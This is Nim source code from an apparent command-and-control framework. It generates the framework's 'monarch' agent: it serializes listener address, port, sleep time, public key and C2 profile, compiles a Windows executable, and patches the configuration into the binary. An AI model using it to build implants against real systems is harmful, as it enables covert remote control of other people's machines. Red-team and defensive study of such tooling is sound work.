import terminal, strformat, strutils, sequtils, tables, times, system, osproc, streams, base64, parsetoml

import ../utils
import ../../common/[types, utils, profile, serialize]
import ../db/database 

const PLACEHOLDER = "PLACEHOLDER"

proc serializeConfiguration(cq: Conquest, listener: Listener, sleep: int): seq[byte] = 
    
    var packer = Packer.init()

    # Add listener configuration 
    packer.add(uint8(CONFIG_LISTENER_UUID))
    packer.add(uint32(sizeof(uint32)))
    packer.add(string.toUuid(listener.listenerId))

    packer.add(uint8(CONFIG_LISTENER_IP))
    packer.add(uint32(listener.address.len))
    packer.addData(string.toBytes(listener.address))

    packer.add(uint8(CONFIG_LISTENER_PORT))
    packer.add(uint32(sizeof(uint32)))
    packer.add(uint32(listener.port))

    packer.add(uint8(CONFIG_SLEEP_DELAY))
    packer.add(uint32(sizeof(uint32)))
    packer.add(uint32(sleep))

    # Add key exchange information 
    packer.add(uint8(CONFIG_PUBLIC_KEY))
    packer.add(uint32(sizeof(Key)))
    packer.addData(cq.keyPair.publicKey)

    # Add C2 profile string
    let profileString = cq.profile.toTomlString()
    packer.add(uint8(CONFIG_PROFILE))
    packer.add(uint32(profileString.len))
    packer.addData(string.toBytes(profileString))

    let data = packer.pack() 
    cq.writeLine(fgBlack, styleBright, "[*] ", resetStyle, "Profile configuration serialized.")
    return data 

proc compile(cq: Conquest, placeholderLength: int): string = 
    
    let 
        cqDir = cq.profile.getString("conquest_directory")
        configFile = fmt"{cqDir}/src/agent/nim.cfg"  
        exeFile = fmt"{cqDir}/bin/monarch.x64.exe" 
        agentBuildScript = fmt"{cqDir}/src/agent/build.sh"    

    # Create/overwrite nim.cfg file to set placeholder for agent configuration 
    let config = fmt"""
        # Agent configuration 
        -d:CONFIGURATION={PLACEHOLDER & "A".repeat(placeholderLength - (2 * len(PLACEHOLDER))) & PLACEHOLDER}
        -o:"{exeFile}"
    """.replace("    ", "")

    writeFile(configFile, config)
    cq.writeLine(fgBlack, styleBright, "[*] ", resetStyle, "Configuration file created.")
    
    # Build agent by executing the ./build.sh script on the system.
    cq.writeLine(fgBlack, styleBright, "[*] ", resetStyle, "Compiling agent.")
    
    try:
        # Using the startProcess function from the 'osproc' module, it is possible to retrieve the output as it is received, line-by-line instead of all at once
        let process = startProcess(agentBuildScript, options={poUsePath, poStdErrToStdOut})
        let outputStream = process.outputStream

        var line: string
        while outputStream.readLine(line):
            cq.writeLine(line) 

        let exitCode = process.waitForExit()

        # Check if the build succeeded or not
        if exitCode == 0:
            cq.writeLine(fgGreen, "[*] ", resetStyle, "Agent payload generated successfully.")
            return exeFile
        else:
            cq.writeLine(fgRed, styleBright, "[-] ", resetStyle, "Build script exited with code ", $exitCode)
            return ""

    except CatchableError as err:
        cq.writeLine(fgRed, styleBright, "[-] ", resetStyle, "An error occurred: ", err.msg)
        return ""
    
proc patch(cq: Conquest, unpatchedExePath: string, configuration: seq[byte]): bool = 
    
    cq.writeLine(fgBlack, styleBright, "[*] ", resetStyle, "Patching profile configuration into agent.")

    try: 
        var exeBytes = readFile(unpatchedExePath) 

        # Find placeholder 
        let placeholderPos = exeBytes.find(PLACEHOLDER) 
        if placeholderPos == -1: 
            raise newException(CatchableError, "Placeholder not found.")
        
        cq.writeLine(fgBlack, styleBright, "[+] ", resetStyle, fmt"Placeholder found at offset {placeholderPos}.")
        # cq.writeLine(exeBytes[placeholderPos..placeholderPos + len(configuration)])

        # Patch placeholder bytes
        for i, c in Bytes.toString(configuration): 
            exeBytes[placeholderPos + i] = c 

        writeFile(unpatchedExePath, exeBytes)
        cq.writeLine(fgGreen, "[+] ", resetStyle, fmt"Agent payload patched successfully: {unpatchedExePath}.")

    except CatchableError as err:
        cq.writeLine(fgRed, styleBright, "[-] ", resetStyle, "An error occurred: ", err.msg) 
        return false

    return true 
    
# Agent generation 
proc agentBuild*(cq: Conquest, listener, sleep: string): bool {.discardable.} =

    # Verify that listener exists
    if not cq.dbListenerExists(listener.toUpperAscii): 
        cq.writeLine(fgRed, styleBright, fmt"[-] Listener {listener.toUpperAscii} does not exist.")
        return false

    let listener = cq.listeners[listener.toUpperAscii] 
    
    var config: seq[byte] 
    if sleep.isEmptyOrWhitespace(): 
        # If no sleep value has been defined, take the default from the profile 
        config = cq.serializeConfiguration(listener, cq.profile.getInt("agent.sleep"))
    else: 
        config = cq.serializeConfiguration(listener, parseInt(sleep))
    
    let unpatchedExePath = cq.compile(config.len)
    if unpatchedExePath.isEmptyOrWhitespace():
        return false

    if not cq.patch(unpatchedExePath, config): 
       return false 

    return true



    
    


